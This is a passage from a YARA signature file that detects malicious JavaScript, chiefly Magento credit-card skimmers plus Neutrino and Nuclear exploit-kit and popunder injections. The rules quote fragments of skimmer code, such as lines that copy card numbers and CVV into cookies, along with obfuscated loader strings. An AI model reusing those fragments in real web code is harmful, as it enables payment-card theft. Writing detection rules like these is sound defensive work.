        $trigger and PR00842 and PR00956
}

private rule PR00957 : trigger
{
    strings:
        $ps0 = "if(resp) jQuery('body').html(resp);"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_058 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00897 and PR00323 and PR00957
}

private rule PR00958 : trigger
{
    strings:
        $ps0 = "location.href.search(\"onepagecheckout"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_059 : malware
{
    strings:
        $trigger = "new RegExp(atob("
    condition:
        $trigger and PR00423 and PR00958
}

private rule PR00959 : trigger
{
    strings:
        $ps0 = "Y2hlY2tvdXQ="
    condition:
        $ps0
}

rule js_malware_magentoccstealer_060 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00959 and PR00846
}

private rule PR00960 : trigger
{
    strings:
        $ps0 = "setTimeout(function()"
    condition:
        $ps0
}

private rule PR00961 : trigger
{
    strings:
        $ps0 = "lmcScr"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_061 : malware
{
    strings:
        $trigger = "!iMCwO())"
    condition:
        $trigger and PR00960 and PR00961 and PR00323
}

rule js_malware_magentoccstealer_061_02 : malware
{
    strings:
        $trigger = "'\\x23\\x30'"
    condition:
        $trigger and PR00960 and PR00961 and PR00323
}

private rule PR00962 : trigger
{
    strings:
        $ps0 = "type:\"POST\",dataType:\"json\",success:function"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_062 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00897 and PR00962 and PR00323
}

private rule PR00963 : trigger
{
    strings:
        $ps0 = ";};var elems={};var result={};var final={};var subkeys,ids;function format(_0x"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_100 : malware
{
    strings:
        $trigger = "document[_0x"
    condition:
        $trigger and PR00963
}

private rule PR00964 : trigger
{
    strings:
        $ps0 = "'cc_cvv';"
    condition:
        $ps0
}

private rule PR00965 : trigger
{
    strings:
        $ps0 = "var checkStatus = \"\";"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_101 : malware
{
    strings:
        $trigger = "encode : function (input) {"
    condition:
        $trigger and PR00664 and PR00964 and PR00965
}

private rule PR00966 : trigger
{
    strings:
        $ps0 = ";urll"
    condition:
        $ps0
}

private rule PR00967 : trigger
{
    strings:
        $ps0 = "rand;"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_102 : malware
{
    strings:
        $trigger = ";document[_"
    condition:
        $trigger and PR00966 and PR00967 and PR00634
}

private rule PR00968 : trigger
{
    strings:
        $ps0 = "'__bill2',_0x"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_103 : malware
{
    strings:
        $trigger = "['atob']||(_0x"
    condition:
        $trigger and PR00639 and PR00900 and PR00968 and PR00638
}

rule js_malware_magentoccstealer_104 : malware
{
    strings:
        $trigger = "c3R5bGU+LkNhcmRCcmFuZEljb24tY29udGFpbmVye2hlaWdodDoxMDAlO3Bvc2l0aW9uOm"
    condition:
        $trigger and PR00639
}

private rule PR00969 : trigger
{
    strings:
        $ps0 = ":btoa(_0x"
    condition:
        $ps0
}

private rule PR00970 : trigger
{
    strings:
        $ps0 = "btoa(JSON[_0x"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_105 : malware
{
    strings:
        $trigger = ";url"
    condition:
        $trigger and PR00969 and PR00639 and PR00970
}

private rule PR00971 : trigger
{
    strings:
        $ps0 = "=String.fromCharCode(127);return _.join(\"\").split(\"%\")"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_106 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR00971 and PR00925
}

private rule PR00972 : trigger
{
    strings:
        $ps0 = "|_cc_number|"
    condition:
        $ps0
}

private rule PR00973 : trigger
{
    strings:
        $ps0 = "|btoa|"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_107 : malware
{
    strings:
        $trigger = "parseInt(c/a)))+((c=c%a)"
    condition:
        $trigger and PR00972 and PR00604 and PR00973 and PR00676
}

private rule PR00974 : trigger
{
    strings:
        $ps0 = "return String.fromCharCode("
    condition:
        $ps0
}

rule js_malware_magentoccstealer_108 : malware
{
    strings:
        $trigger = "selectedIndex].innerText:''};function detect(detector,callback,try_after){var interval"
    condition:
        $trigger and PR00974
}

private rule PR00975 : trigger
{
    strings:
        $ps0 = "$newform = $('<form action=\"'+geUrl+"
    condition:
        $ps0
}

private rule PR00976 : trigger
{
    strings:
        $ps0 = "return btoa(encodeURIComponent(str).replace("
    condition:
        $ps0
}

rule js_malware_magentoccstealer_109 : malware
{
    strings:
        $trigger = "#co-billing-form"
    condition:
        $trigger and PR00975 and PR00976 and PR00974
}

private rule PR00977 : trigger
{
    strings:
        $ps0 = ".concat(hosturl,\"\\\"},{"
    condition:
        $ps0
}

private rule PR00978 : trigger
{
    strings:
        $ps0 = "window.atob("
    condition:
        $ps0
}

private rule PR00979 : trigger
{
    strings:
        $ps0 = "document.onclick"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_110 : malware
{
    strings:
        $trigger = ".click(function(event)"
    condition:
        $trigger and PR00977 and PR00978 and PR00979
}

private rule PR00980 : trigger
{
    strings:
        $ps0 = "document.cookie = \"currentcvv=\" + document.getElementsByName(\"payment"
    condition:
        $ps0
}

private rule PR00981 : trigger
{
    strings:
        $ps0 = "if(document.getElementsByName(\"payment[cc_exp_year]\")[0]) {document.cookie = \"currentyear=\" + document.getElementsByName(\"payment[cc_exp_year]\")[0].value +\"; path=/\";}"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_111 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR00980 and PR00981 and PR00925
}

// MANUAL FIX NECESSARY
rule js_malware_magentoccstealer_111_02 : malware
{
    strings:
        $trigger = " * @package  "
        $js_malware_magentoccstealer_111_02_r0 = /cccid\s+=\s+'';\s+if\(document\.getElementsByName\(\\"payment\[cc_number\]/
    condition:
        $trigger and PR00980 and PR00925 and $js_malware_magentoccstealer_111_02_r0
}

private rule PR00982 : trigger
{
    strings:
        $ps0 = "undefined;function loadScript"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_113 : malware
{
    strings:
        $trigger = "indexOf(\"admin\")>-1?true:false;if(cookieCheck){setCookieForm(cookName,genStr"
    condition:
        $trigger and PR00632 and PR00982
}

private rule PR00983 : trigger
{
    strings:
        $ps0 = "crypt=new Encrypt.JSEncrypt()"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_113_02 : malware
{
    strings:
        $trigger = "indexOf(\"admin\")>-1?true:false;if(cookieCheck){setCookieForm(cookName,genStr"
    condition:
        $trigger and PR00983 and PR00632
}

private rule PR00984 : trigger
{
    strings:
        $ps0 = "){if(/payment\\.save()"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_114 : malware
{
    strings:
        $trigger = "window.location.href,document.cookie"
    condition:
        $trigger and PR00423 and PR00883 and PR00984
}

private rule PR00985 : trigger
{
    strings:
        $ps0 = "localStorage[jjlskey] = text;"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_116 : malware
{
    strings:
        $trigger = "fetch(jjlink).then(response => {"
    condition:
        $trigger and PR00842 and PR00985 and PR00954
}

// MANUAL FIX NECESSARY
private rule PR00986 : trigger
{
    strings:
        $ps0 = "_jj=_0x"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_116_02 : malware
{
    strings:
        $trigger = ">"
        $js_malware_magentoccstealer_116_02_r0 = /^[\s]*_jj=_0x[\w]+=>[^\n]{9000}/
    condition:
        $trigger and PR00986 and $js_malware_magentoccstealer_116_02_r0
}

private rule PR00987 : trigger
{
    strings:
        $ps0 = "document.getElementById(\"cloud\").outerHTML = \"\";"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_117 : malware
{
    strings:
        $trigger = ")).test(window.location) && !(new RegExp(\"cart\").test(window.location))){"
    condition:
        $trigger and PR00987
}

private rule PR00988 : trigger
{
    strings:
        $ps0 = "}function sos(){"
    condition:
        $ps0
}

private rule PR00989 : trigger
{
    strings:
        $ps0 = "{if(gid(fp[0x"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_118 : malware
{
    strings:
        $trigger = "\\x"
    condition:
        $trigger and PR00988 and PR00989 and PR00647
}

private rule PR00990 : trigger
{
    strings:
        $ps0 = "|save|payment|onclick|click'.split"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_119 : malware
{
    strings:
        $trigger = "parseInt(c/a)))+((c=c%a)"
    condition:
        $trigger and PR00990 and PR00604 and PR00973 and PR00676
}

// MANUAL FIX NECESSARY
rule js_malware_magentoccstealer_121 : malware
{
    strings:
        $trigger = "document["
        $js_malware_magentoccstealer_121_r0 = /=\s*'';\s*for\s*\(/
        $js_malware_magentoccstealer_121_r1 = /var\s\w+=\[('[^']{1,50}',){400}/
    condition:
        $trigger and $js_malware_magentoccstealer_121_r0 and $js_malware_magentoccstealer_121_r1
}

// MANUAL FIX NECESSARY
rule js_malware_magentoccstealer_121_02 : malware
{
    strings:
        $trigger = "+'ey'](keyCrypt),crypt;};"
        $js_malware_magentoccstealer_121_02_r0 = /=\s*'';\s*for\s*\(/
    condition:
        $trigger and PR00647 and $js_malware_magentoccstealer_121_02_r0
}

private rule PR00991 : trigger
{
    strings:
        $ps0 = "jQuery(\"#checkout\").find(\"select,input\").serializeArray();"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_122 : malware
{
    strings:
        $trigger = "jQuery.ajax({url:document.URL,type:\"post"
    condition:
        $trigger and PR00423 and PR00883 and PR00991
}

rule js_malware_magentoccstealer_123 : malware
{
    strings:
        $trigger = ");setInterval(function(){if(typeof jQuery==\"undefined\")return;new self[\"Function\"||\"Object\"](protoElem).call();},0x"
    condition:
        $trigger and PR00676
}

// MANUAL FIX NECESSARY
rule js_malware_magentoccstealer_123_02 : malware
{
    strings:
        $trigger = "setInterval(function(){if(typeof jQuery==\"undefined\")return;new self[\"Function\"||\"Object\"](protoElem).call();},0x"
        $js_malware_magentoccstealer_123_02_r0 = /var [\w]+[\s]*=[\s]*\"[^;]{100,}\";/
    condition:
        $trigger and PR00676 and $js_malware_magentoccstealer_123_02_r0
}

private rule PR00992 : trigger
{
    strings:
        $ps0 = "\"\\x3D\",\"\\x26\",\"\\x65\\x78\\x65\\x63"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_124 : malware
{
    strings:
        $trigger = "document[_0x"
    condition:
        $trigger and PR00992
}

private rule PR00993 : trigger
{
    strings:
        $ps0 = "document.getElementById(\"authorizenet_cc_number\").value.length,"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_125 : malware
{
    strings:
        $trigger = "\",!0),c.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\")"
    condition:
        $trigger and PR00906 and PR00993
}

private rule PR00994 : trigger
{
    strings:
        $ps0 = "unction(i,s,o,g,r,a,m){i['GoogleAnalyticsObjects']"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_126 : malware
{
    strings:
        $trigger = "location.href.indexOf(i.atob("
    condition:
        $trigger and PR00994 and PR00323
}

private rule PR00995 : trigger
{
    strings:
        $ps0 = "document.cookie.indexOf("
    condition:
        $ps0
}

private rule PR00996 : trigger
{
    strings:
        $ps0 = "await fetch("
    condition:
        $ps0
}

rule js_malware_magentoccstealer_128 : malware
{
    strings:
        $trigger = "let _0x"
    condition:
        $trigger and PR00995 and PR00996
}

private rule PR00997 : trigger
{
    strings:
        $ps0 = "=['zNjVBq==','CMvTB3zLsxrLBq==','zgvMAw5LuhjVCgvYDhK=','CgfYC2u=','zgvZA3rVCa==','y2HLy2TVDxq=','yMvMB3jLDw5SB2fK','zMLUza==','C3bSAxq=','Bw9IAwXL','C2vHCMnO','CMvWBgfJzq=='"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_131 : malware
{
    strings:
        $trigger = "document[_0x"
    condition:
        $trigger and PR00638 and PR00997
}

private rule PR00998 : trigger
{
    strings:
        $ps0 = "\\x64\\x65\\x66\\x61\\x75\\x6C\\x74\\x2F\\x69\\x6D\\x61\\x67\\x65\\x73\\x2F"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_132 : malware
{
    strings:
        $trigger = "='b"
    condition:
        $trigger and PR00029 and PR00998
}

private rule PR00999 : trigger
{
    strings:
        $ps0 = "|atob|var'.split('|')"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_134 : malware
{
    strings:
        $trigger = "parseInt(c/a)))+((c=c%a)"
    condition:
        $trigger and PR00999 and PR00604 and PR00973 and PR00676
}

private rule PR01000 : trigger
{
    strings:
        $ps0 = "PHNjcmlwdCBpZD0icGF5bWVudF"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_136 : malware
{
    strings:
        $trigger = "appendTo('head');"
    condition:
        $trigger and PR00692 and PR01000
}

private rule PR01001 : trigger
{
    strings:
        $ps0 = "new self[\"Function\"||\"Object\"]"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_137 : malware
{
    strings:
        $trigger = "aWYobmV3IFJlZ0V4cCgiY2hlY2tvdXQiKS50ZXN0KH"
    condition:
        $trigger and PR00692 and PR01001
}

private rule PR01002 : trigger
{
    strings:
        $ps0 = "$('#loginForm').submit(function() {"
    condition:
        $ps0
}

private rule PR01003 : trigger
{
    strings:
        $ps0 = "$('#login').val()"
    condition:
        $ps0
}

private rule PR01004 : trigger
{
    strings:
        $ps0 = "dataType: \"json\","
    condition:
        $ps0
}

rule js_malware_magentoccstealer_138 : malware
{
    strings:
        $trigger = "document.head.appendChild"
    condition:
        $trigger and PR01002 and PR00842 and PR01003 and PR01004
}

private rule PR01005 : trigger
{
    strings:
        $ps0 = "|bom|"
    condition:
        $ps0
}

private rule PR01006 : trigger
{
    strings:
        $ps0 = "|x3F|function|else|setInterval|100'.split('|'),0,{}))"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_139 : malware
{
    strings:
        $trigger = "parseInt(c/a)))+((c=c%a)"
    condition:
        $trigger and PR00604 and PR01005 and PR00676 and PR01006
}

private rule PR01007 : trigger
{
    strings:
        $ps0 = ")]={'[name=ccard_ccnumber]':_0x"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_140 : malware
{
    strings:
        $trigger = "document[_0x"
    condition:
        $trigger and PR00638 and PR01007
}

rule js_malware_magentoccstealer_141 : malware
{
    strings:
        $trigger = ".charCodeAt()-(3*10); i=i+"
    condition:
        $trigger and PR00653 and PR00906
}

rule js_malware_magentoccstealer_142 : malware
{
    strings:
        $trigger = "webkitAllselectElement=['','O','47O47O99"
    condition:
        $trigger and PR00653 and PR00371
}

rule js_malware_magentoccstealer_143 : malware
{
    strings:
        $trigger = "[\"\\x73\\x75\\x62\\x6D\\x69\\x74\",\"\\x50\\x4F\\x53\\x54\",\"\\x2F\\x3F\\x77\\x63\\x2D\\x61\\x6A\\x61\\x78\\x3D\\x70\\x72\\x6F\\x63\\x65\\x73\\x73\","
    condition:
        $trigger and PR00332
}

rule js_malware_magentoccstealer_144 : malware
{
    strings:
        $trigger = "]('')&&(Default_Send(),setInterval("
    condition:
        $trigger and PR00639
}

private rule PR01008 : trigger
{
    strings:
        $ps0 = "=\\x22payment.','"
    condition:
        $ps0
}

private rule PR01009 : trigger
{
    strings:
        $ps0 = ";}}:function(){};return _0x"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_145 : malware
{
    strings:
        $trigger = ")+'\\x20)')"
    condition:
        $trigger and PR01008 and PR01009 and PR00507
}

private rule PR01010 : trigger
{
    strings:
        $ps0 = ";(function(_0x"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_145_02 : malware
{
    strings:
        $trigger = ")+'\\x20)')"
    condition:
        $trigger and PR01010 and PR01009 and PR00507
}

private rule PR01011 : trigger
{
    strings:
        $ps0 = "= Mage::GetBaseDir();"
    condition:
        $ps0
}

private rule PR01012 : trigger
{
    strings:
        $ps0 = " * @package  "
    condition:
        $ps0
}

private rule PR01013 : trigger
{
    strings:
        $ps0 = "require $"
    condition:
        $ps0
}

private rule PR01014 : trigger
{
    strings:
        $ps0 = ".jpg';"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_146 : malware
{
    strings:
        $trigger = "payment"
    condition:
        $trigger and PR01011 and PR01012 and PR01013 and PR01014
}

private rule PR01015 : trigger
{
    strings:
        $ps0 = "];if(@$"
    condition:
        $ps0
}

private rule PR01016 : trigger
{
    strings:
        $ps0 = "].$"
    condition:
        $ps0
}

private rule PR01017 : trigger
{
    strings:
        $ps0 = "));@$"
    condition:
        $ps0
}

private rule PR01018 : trigger
{
    strings:
        $ps0 = "('', @"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_147 : malware
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR01015 and PR01016 and PR01017 and PR01012 and PR01018
}

private rule PR01019 : trigger
{
    strings:
        $ps0 = "={'_keyStr':_0x"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_148 : malware
{
    strings:
        $trigger = "document[_0x"
    condition:
        $trigger and PR00638 and PR01019
}

private rule PR01020 : trigger
{
    strings:
        $ps0 = "=['/','/','"
    condition:
        $ps0
}

private rule PR01021 : trigger
{
    strings:
        $ps0 = "echo"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_148_02 : malware
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01020 and PR01021 and PR00397
}

// MANUAL FIX NECESSARY
private rule PR01022 : trigger
{
    strings:
        $ps0 = ");};injector["
    condition:
        $ps0
}

rule js_malware_magentoccstealer_149 : malware
{
    strings:
        $trigger = "document["
        $js_malware_magentoccstealer_149_r0 = /=\s*'';\s*for\s*\(/
    condition:
        $trigger and PR01022 and $js_malware_magentoccstealer_149_r0
}

private rule PR01023 : trigger
{
    strings:
        $ps0 = "('body')[0].appendChild("
    condition:
        $ps0
}

private rule PR01024 : trigger
{
    strings:
        $ps0 = "eventsListenerPool"
    condition:
        $ps0
}

private rule PR01025 : trigger
{
    strings:
        $ps0 = ".async = true;"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_150 : malware
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR00664 and PR01023 and PR01024 and PR01025
}

private rule PR01026 : trigger
{
    strings:
        $ps0 = ")](encodeURIComponent, location[_0x"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_151 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00692 and PR00323 and PR01026
}

private rule PR01027 : trigger
{
    strings:
        $ps0 = "fromCharCode(parseInt("
    condition:
        $ps0
}

private rule PR01028 : trigger
{
    strings:
        $ps0 = "function queryDefaultNameOptions("
    condition:
        $ps0
}

rule js_malware_magentoccstealer_152 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00676 and PR01027 and PR01028
}

private rule PR01029 : trigger
{
    strings:
        $ps0 = "115%2C112%2C108%2C105%2C116%2C44"
    condition:
        $ps0
}

private rule PR01030 : trigger
{
    strings:
        $ps0 = "parseInt("
    condition:
        $ps0
}

private rule PR01031 : trigger
{
    strings:
        $ps0 = "eval(decodeURIComponent("
    condition:
        $ps0
}

private rule PR01032 : trigger
{
    strings:
        $ps0 = "String.fromCharCode"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_153 : malware
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR00050 and PR01029 and PR01030 and PR01031 and PR01032 and PR00322
}

private rule PR01033 : trigger
{
    strings:
        $ps0 = "(document).ready(function"
    condition:
        $ps0
}

private rule PR01034 : trigger
{
    strings:
        $ps0 = "getScript(atob"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_154 : malware
{
    strings:
        $trigger = "aHR0cHM6Ly9"
    condition:
        $trigger and PR01033 and PR01034
}

rule js_malware_mailuseful_001 : malware
{
    strings:
        $trigger = "g.rmEeOu+ I>X=59Tlaqs4FUCBRWy!Y03n"
    condition:
        $trigger and PR00641
}

private rule PR01035 : trigger
{
    strings:
        $ps0 = "analytic"
    condition:
        $ps0
}

private rule PR01036 : trigger
{
    strings:
        $ps0 = "realstatistics"
    condition:
        $ps0
}

rule js_malware_neutrino_001 : malware
{
    strings:
        $trigger = "php?id="
    condition:
        $trigger and PR01035 and PR00050 and PR01036
}

private rule PR01037 : trigger
{
    strings:
        $ps0 = "php?id="
    condition:
        $ps0
}

rule js_malware_neutrino_001_02 : malware
{
    strings:
        $trigger = "realanalytics"
    condition:
        $trigger and PR00050 and PR01037
}

rule js_malware_neutrino_001_03 : malware
{
    strings:
        $trigger = "real-analytics"
    condition:
        $trigger and PR00050 and PR01037
}

private rule PR01038 : trigger
{
    strings:
        $ps0 = "istatistics"
    condition:
        $ps0
}

rule js_malware_neutrino_001_04 : malware
{
    strings:
        $trigger = "php?id="
    condition:
        $trigger and PR01035 and PR00050 and PR01038
}

rule js_malware_neutrino_001_05 : malware
{
    strings:
        $trigger = "siteanalytics"
    condition:
        $trigger and PR00050 and PR01037
}

rule js_malware_neutrino_001_06 : malware
{
    strings:
        $trigger = "webstatistics"
    condition:
        $trigger and PR01035 and PR00050 and PR01037
}

rule js_malware_neutrino_001_07 : malware
{
    strings:
        $trigger = "adsstat"
    condition:
        $trigger and PR01035 and PR00050 and PR01037
}

private rule PR01039 : trigger
{
    strings:
        $ps0 = "realtds"
    condition:
        $ps0
}

rule js_malware_neutrino_001_08 : malware
{
    strings:
        $trigger = "php?id="
    condition:
        $trigger and PR01039 and PR01035 and PR00050
}

rule js_malware_neutrino_001_09 : malware
{
    strings:
        $trigger = "trafficanalytics"
    condition:
        $trigger and PR00050
}

rule js_malware_neutrino_003 : malware
{
    strings:
        $trigger = "id=\"scriptData"
    condition:
        $trigger and PR00050 and PR01036
}

private rule PR01040 : trigger
{
    strings:
        $ps0 = "realanalytics"
    condition:
        $ps0
}

rule js_malware_neutrino_003_02 : malware
{
    strings:
        $trigger = "id=\"scriptData"
    condition:
        $trigger and PR01040 and PR00050
}

private rule PR01041 : trigger
{
    strings:
        $ps0 = "id=\"scriptData"
    condition:
        $ps0
}

rule js_malware_neutrino_003_03 : malware
{
    strings:
        $trigger = "real-analytics"
    condition:
        $trigger and PR00050 and PR01041
}

rule js_malware_neutrino_003_04 : malware
{
    strings:
        $trigger = "id=\"scriptData"
    condition:
        $trigger and PR00050 and PR01038
}

rule js_malware_neutrino_003_05 : malware
{
    strings:
        $trigger = "siteanalytics"
    condition:
        $trigger and PR00050 and PR01041
}

rule js_malware_neutrino_003_06 : malware
{
    strings:
        $trigger = "webstatistics"
    condition:
        $trigger and PR00050 and PR01041
}

rule js_malware_neutrino_003_07 : malware
{
    strings:
        $trigger = "adsstat"
    condition:
        $trigger and PR00050 and PR01041
}

rule js_malware_neutrino_003_08 : malware
{
    strings:
        $trigger = "id=\"scriptData"
    condition:
        $trigger and PR01039 and PR00050
}

private rule PR01042 : trigger
{
    strings:
        $ps0 = "\"write\",'<script src=\"http://niu.code668.com"
    condition:
        $ps0
}

rule js_malware_niu_code668_com_001 : malware
{
    strings:
        $trigger = "var _$=[\"document\",\"write\",'<script src"
    condition:
        $trigger and PR01042
}

rule js_malware_nuclear_001 : malware
{
    strings:
        $trigger = "\"<div style='position:absolute;z-index:1000;top:-1000px;left:-9999px;'><iframe"
    condition:
        $trigger and PR00669
}

// MANUAL FIX NECESSARY
rule js_malware_nuclearexploitkit_009 : malware
{
    strings:
        $trigger = "document.write"
        $js_malware_nuclearexploitkit_009_r0 = /document.write[^>]+iframe.src[^>]+\.\w{2,}.[a-z]{6,}[0-9][0-9]\.(khml|htm|html|php)[^<]+<.iframe>..;/
    condition:
        $trigger and $js_malware_nuclearexploitkit_009_r0
}

// MANUAL FIX NECESSARY
rule js_malware_nuclearexploitkit_010 : malware
{
    strings:
        $trigger = "document.write"
        $js_malware_nuclearexploitkit_010_r0 = /document.write[^>]+iframe.src[^>]+\.\w{2,}.[a-z]{6,}[0-9][0-9]\.(khml|htm|html|php)[^<]+<.iframe>..,/
    condition:
        $trigger and $js_malware_nuclearexploitkit_010_r0
}

// MANUAL FIX NECESSARY
rule js_malware_nuclearexploitkit_011 : malware
{
    strings:
        $trigger = "document.write"
        $js_malware_nuclearexploitkit_011_r0 = /document.write[^>]+.src[^>]+\.\w{2,}.[a-z]{6,}[0-9][0-9]\.(khml|htm|html|php)[^<]+<.iframe>..,/
    condition:
        $trigger and $js_malware_nuclearexploitkit_011_r0
}

// MANUAL FIX NECESSARY
rule js_malware_nuclearexploitkit_012 : malware
{
    strings:
        $trigger = "document.write"
        $js_malware_nuclearexploitkit_012_r0 = /document.write[^>]+.src[^>]+\.\w{2,}.[a-z]{6,}[0-9][0-9]\.(khml|htm|html|php)[^<]+<.iframe>..;/
    condition:
        $trigger and $js_malware_nuclearexploitkit_012_r0
}

// MANUAL FIX NECESSARY
rule js_malware_nuclearexploitkit_013 : malware
{
    strings:
        $trigger = "document.write"
        $js_malware_nuclearexploitkit_013_r0 = /function nnn_action/
    condition:
        $trigger and $js_malware_nuclearexploitkit_013_r0
}

private rule PR01043 : trigger
{
    strings:
        $ps0 = "},'removeCookie':function(){return'dev';},'getCookie':function("
    condition:
        $ps0
}

private rule PR01044 : trigger
{
    strings:
        $ps0 = "setCookie':function("
    condition:
        $ps0
}

rule js_malware_obfuscated_001 : malware
{
    strings:
        $trigger = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    condition:
        $trigger and PR01043 and PR01044 and PR00952
}

// MANUAL FIX NECESSARY
rule js_malware_obfuscated_001_02 : malware
{
    strings:
        $trigger = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        $js_malware_obfuscated_001_02_r0 = />[\s]*var [\w]+[\s]*=[\s]*[\d]+;[\s]*<.script/
    condition:
        $trigger and PR01043 and PR00952 and $js_malware_obfuscated_001_02_r0
}

private rule PR01045 : trigger
{
    strings:
        $ps0 = "(function(){var _0x"
    condition:
        $ps0
}

rule js_malware_obfuscated_001_03 : malware
{
    strings:
        $trigger = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    condition:
        $trigger and PR01043 and PR01045 and PR00952
}

private rule PR01046 : trigger
{
    strings:
        $ps0 = ")+a0b('0x"
    condition:
        $ps0
}

rule js_malware_obfuscated_003 : malware
{
    strings:
        $trigger = "var a0a=["
    condition:
        $trigger and PR00647 and PR01046
}

rule js_malware_onclickads_net_001 : malware
{
    strings:
        $trigger = "C8N8HU|gd|is"
    condition:
        $trigger and PR00604
}

rule js_malware_oxxtm_001 : malware
{
    strings:
        $trigger = "x72|eval|x64|x61|x6c"
    condition:
        $trigger and PR00604
}

private rule PR01047 : trigger
{
    strings:
        $ps0 = "/moc.nibetsap//:ptth\"=crs"
    condition:
        $ps0
}

rule js_malware_pastebin_reversed_001 : malware
{
    strings:
        $trigger = "document.write"
    condition:
        $trigger and PR01047
}

private rule PR01048 : trigger
{
    strings:
        $ps0 = "\\x22\\x3D\\x63\\x72\\x73\\x20\\x74\\x70\\x69\\x72\\x63\\x73\\x3C\",\"\\x77\\x72\\x69\\x74\\x65\"];document[_"
    condition:
        $ps0
}

rule js_malware_pastebin_reversed_002 : malware
{
    strings:
        $trigger = "\\x2F\\x77\\x61\\x72\\x2F\\x6D\\x6F\\x63\\x2E\\x6E\\x69\\x62\\x65\\x74\\x73\\x61\\x70\\x2F\\x2F\\x3A"
    condition:
        $trigger and PR01048 and PR00332
}

private rule PR01049 : trigger
{
    strings:
        $ps0 = "\\\\x2F\\\\x77\\\\x61\\\\x72\\\\x2F\\\\x6D\\\\x6F\\\\x63\\\\x2E\\\\x6E\\\\x69\\\\x62\\\\x65\\\\x74\\\\x73\\\\x61\\\\x70\\\\x2F"
    condition:
        $ps0
}

rule js_malware_pastebin_reversed_003 : malware
{
    strings:
        $trigger = "\\\\x3D\\\\x63\\\\x72\\\\x73\\\\x20\\\\x74\\\\x70\\\\x69\\\\x72\\\\x63\\\\x73\\\\x3C\\\",\\\"\\\\x77\\\\x72\\\\x69\\\\x74\\\\x65\\\"];document[_"
    condition:
        $trigger and PR01049 and PR00332
}

rule js_malware_payment_redirect_001 : malware
{
    strings:
        $trigger = "if((location.href.indexOf(\"checkout/klarna\") + 1) && !(document.cookie.indexOf(\"userpayid\")"
    condition:
        $trigger
}

rule js_malware_peguards_cc_001 : malware
{
    strings:
        $trigger = "cookie.indexOf(\"google_api=1;\""
    condition:
        $trigger and PR00050 and PR00323
}

private rule PR01050 : trigger
{
    strings:
        $ps0 = "popads.net"
    condition:
        $ps0
}

private rule PR01051 : trigger
{
    strings:
        $ps0 = "document.getElementsByTagName('script')[0];"
    condition:
        $ps0
}

rule js_malware_popads_002 : malware
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR01050 and PR01051
}

private rule PR01052 : trigger
{
    strings:
        $ps0 = "var popunder"
    condition:
        $ps0
}

private rule PR01053 : trigger
{
    strings:
        $ps0 = "function amAddScript(sUrl)"
    condition:
        $ps0
}

rule js_malware_popads_003 : malware
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR00664 and PR01052 and PR00666 and PR01053
}

private rule PR01054 : trigger
{
    strings:
        $ps0 = "function PopShow3"
    condition:
        $ps0
}

rule js_malware_PopShow3_001 : malware
{
    strings:
        $trigger = "kmr9eE1=update"
    condition:
        $trigger and PR01054 and PR00050
}

rule js_malware_PopShow3_002 : malware
{
    strings:
        $trigger = "<script>function PopShow3(){var"
    condition:
        $trigger
}

private rule PR01055 : trigger
{
    strings:
        $ps0 = "\"PopWin3\",\"_blank,resizable=1,toolbar=1,location=1,menubar=1,status=1,scrollbars=1\");"
    condition:
        $ps0
}

rule js_malware_PopShow3_003 : malware
{
